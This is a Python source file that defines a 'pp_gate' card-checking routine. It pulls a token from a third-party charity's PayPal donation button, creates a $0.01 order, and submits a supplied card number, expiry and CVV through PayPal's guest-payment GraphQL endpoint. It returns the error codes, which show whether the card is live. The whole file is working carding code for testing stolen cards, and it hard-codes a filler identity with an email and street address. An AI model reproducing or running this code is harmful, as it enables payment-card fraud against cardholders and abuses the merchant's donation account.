from html import unescape
from httpx import AsyncClient
from utilsdf.functions import capture


async def pp_gate(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        head = {"Host": "www.paypal.com", "referer": "https://ghcop.org/"}

        r = await session.get(
            "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
            headers=head,
        )
        token = unescape(capture(r.text, '"facilitatorAccessToken":"', '"').strip())

        head2 = {
            "content-type": "application/json",
            "authorization": f"Bearer {token}",
            "referer": "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
        }

        post2 = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"0.01","breakdown":{"item_total":{"currency_code":"USD","value":"0.01"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"0.01"},"quantity":"1","category":"DONATION"}],"description":"Sachio YT"}],"intent":"CAPTURE","application_context":{}}'

        r2 = await session.post(
            "https://www.paypal.com/v2/checkout/orders",
            headers=head2,
            data=post2,
        )
        id_ = capture(r2.text, '"id":"', '"')

        post3 = {
            "query": f"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {{\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {{\n                flags {{\n                    is3DSecureRequired\n                }}\n                cart {{\n                    intent\n                    cartId\n                    buyer {{\n                        userId\n                        auth {{\n                            accessToken\n                        }}\n                    }}\n                    returnUrl {{\n                        href\n                    }}\n                }}\n                paymentContingencies {{\n                    threeDomainSecure {{\n                        status\n                        method\n                        redirectUrl {{\n                            href\n                        }}\n                        parameter\n                    }}\n                }}\n            }}\n        }}\n    ",
            "variables": {
                "token": id_,
                "card": {
                    "cardNumber": cc,
                    "expirationDate": f"{month}/{year}",
                    "postalCode": "10027",
                    "securityCode": cvv,
                },
                "phoneNumber": "19006318646",
                "firstName": "Sachio",
                "lastName": "YT",
                "billingAddress": {
                    "givenName": "Sachio",
                    "familyName": "YT",
                    "line1": "118 W 132nd St",
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10027",
                    "country": "US",
                },
                "shippingAddress": {
                    "givenName": "Sachio",
                    "familyName": "YT",
                    "line1": "118 W 132nd St",
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10027",
                    "country": "US",
                },
                "email": "sachiopremiun@gmail.com",
                "currencyConversionType": "PAYPAL",
            },
            "operationName": None,
        }

        head3 = {
            "content-type": "application/json",
            "referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token={id_}",
        }

        r3 = await session.post(
            "https://www.paypal.com/graphql?fetch_credit_form_submit",
            headers=head3,
            json=post3,
        )
        t3 = r3.text
        message_error = capture(t3, '"message":"', '"')
        code_error = capture(t3, '"code":"', '"')
        return message_error, code_error
